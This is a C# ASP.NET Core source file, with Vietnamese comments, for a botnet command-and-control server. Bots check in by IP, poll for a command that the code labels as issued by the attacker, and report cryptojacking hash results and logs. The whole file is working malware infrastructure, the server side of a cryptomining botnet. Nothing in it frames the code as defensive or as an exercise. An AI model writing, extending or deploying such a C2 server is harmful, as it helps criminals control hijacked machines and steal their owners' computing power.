using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;

namespace CncServer.Controllers
{
    // Model cho request đặt lệnh
    public class SetCommandRequest
    {
        public string Command { get; set; }
    }

    public class BotInfo
    {
        public string BotId { get; set; }
        public DateTime LastSeen { get; set; }
        public string Status { get; set; }
    }
    public class CryptoJackResult
    {
        public string BotId { get; set; }
        public long Nonce { get; set; }
        public string Hash { get; set; }
        public DateTime Timestamp { get; set; } = DateTime.UtcNow;
    }
    public class LogRequest
    {
        public string BotId { get; set; }
        public string Message { get; set; }
    }

    [ApiController]
    [Route("bot")]
    public class BotController : ControllerBase
    {
        private static readonly ConcurrentDictionary<string, BotInfo> _bots = new ConcurrentDictionary<string, BotInfo>();
        private static string _command = "idle";
        private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();

        // Hàm helper để lấy IP của Bot
        private string GetBotIp()
        {
            return HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
        }

        [HttpPost("checkin")]
        public IActionResult CheckIn([FromBody] BotInfo botInfo)
        {
            // Tự động gán BotId bằng IP của người gửi request
            string ip = GetBotIp();

            botInfo.BotId = ip;
            botInfo.LastSeen = DateTime.UtcNow;

            _bots[ip] = botInfo;
            return Ok();
        }

        [HttpGet("getcommand")]
        public IActionResult GetCommand()
        {
            string ip = GetBotIp();

            if (_bots.ContainsKey(ip))
            {
                // Cập nhật last seen khi bot hỏi lệnh
                _bots[ip].LastSeen = DateTime.UtcNow;
                return Ok(new { command = _command });
            }
            // Nếu bot chưa checkin mà hỏi lệnh, bắt nó checkin trước (hoặc vẫn trả lệnh default)
            return Ok(new { command = _command });
        }

        // === NÂNG CẤP: Nhận một model JSON thay vì chuỗi thô ===
        [HttpPost("setcommand")]
        public IActionResult SetCommand([FromBody] SetCommandRequest request)
        {
            if (string.IsNullOrWhiteSpace(request?.Command))
            {
                return BadRequest("Command model is invalid.");
            }
            _command = request.Command.ToLower(); // Chuẩn hóa lệnh thành chữ thường
            Console.WriteLine($"\n[*] New command issued by attacker: '{_command}'\n");
            return Ok($"Command set to: {_command}");
        }

        [HttpGet("list")]
        public IActionResult ListBots()
        {
            return Ok(_bots.Values);
        }

        [HttpPost("submitresult")]
        public IActionResult SubmitResult([FromBody] CryptoJackResult result)
        {
            if (result == null || string.IsNullOrEmpty(result.BotId))
            {
                return BadRequest("Invalid result data.");
            }
            _results.Add(result);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[SUCCESS] Bot {result.BotId} found a hash!");
            Console.WriteLine($"   -> Nonce: {result.Nonce}, Hash: {result.Hash.Substring(0, 10)}...");
            Console.ResetColor();
            return Ok("Result received.");
        }

        [HttpGet("results")]
        public IActionResult GetResults()
        {
            return Ok(_results.OrderByDescending(r => r.Timestamp));
        }

        [HttpPost("log")]
        public IActionResult LogStatus([FromBody] LogRequest logRequest)
        {
            if (logRequest == null || string.IsNullOrEmpty(logRequest.BotId))
            {
                return BadRequest("Invalid log data.");
            }

            // In log ra console của SERVER với màu sắc để dễ phân biệt
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine($"[LOG from {logRequest.BotId.Substring(0, 8)}...]: {logRequest.Message}");
            Console.ResetColor();

            return Ok("Log received.");
        }
    }
}